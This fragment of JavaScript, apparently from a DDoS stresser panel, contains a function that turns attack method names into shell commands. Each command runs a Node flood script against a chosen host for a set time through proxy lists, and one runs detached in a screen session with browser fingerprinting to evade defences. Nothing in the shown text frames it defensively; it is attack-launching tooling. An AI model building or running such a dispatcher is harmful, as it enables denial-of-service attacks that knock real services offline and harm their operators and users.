...
const generateCommand = (method, host, port, time) => {
    switch (method) {
        ...
        case 'CATMIA':
            return `cd /root/methods && node Vzy.js ${host} ${time} 32 10 proxy.txt`;
        case 'MIX':
            return `cd /root/methods && node mix.js ${host} ${time} 8 32 proxy.txt -v 1`;
        case 'TLS':
        ...
        case 'BROWSER':
            return `cd /root/methods && screen -dm node browsern.js ${host} ${time} 8 --fingerprint basic --proxy px.txt`;
        case 'H2NEYLI':
